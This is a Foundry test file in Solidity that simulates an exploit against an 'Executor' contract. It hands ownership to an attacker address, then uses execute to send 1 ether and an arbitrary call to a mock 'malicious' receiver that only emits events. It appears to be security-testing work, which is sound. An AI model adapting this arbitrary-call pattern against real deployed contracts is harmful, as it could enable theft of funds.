// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../../src/Executor.sol";

// Fake malicious contract to receive ETH and log reentrancy
contract AttackerReceiver {
    event FallbackTriggered(address sender, uint256 value, bytes data);

    receive() external payable {
        emit FallbackTriggered(msg.sender, msg.value, msg.data);
    }

    function maliciousLogic() external payable {
        emit FallbackTriggered(msg.sender, msg.value, msg.data);
    }
}

contract ExecutorExploit is Test {
    Executor executor;
    address deployer;
    address attacker;
    AttackerReceiver attackerContract;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1337);

        // Deploy Executor with deployer as initial owner
        executor = new Executor(deployer);

        // Deploy malicious contract
        attackerContract = new AttackerReceiver();

        // Simulate owner transfer bug (e.g. in Timelock logic)
        executor.transferOwnership(attacker);
        assertEq(executor.owner(), attacker);
    }

    function testExploitExecuteArbitraryCall() public {
        vm.startPrank(attacker);

        // Craft payload to call `maliciousLogic()` on attacker's contract
        bytes memory payload = abi.encodeWithSignature("maliciousLogic()");

        // Execute call with ETH to arbitrary contract (external call attack vector)
        executor.execute{value: 1 ether}(address(attackerContract), 1 ether, payload);

        vm.stopPrank();
    }

    // Ensure test contract can receive ETH for testing
    receive() external payable {}
}
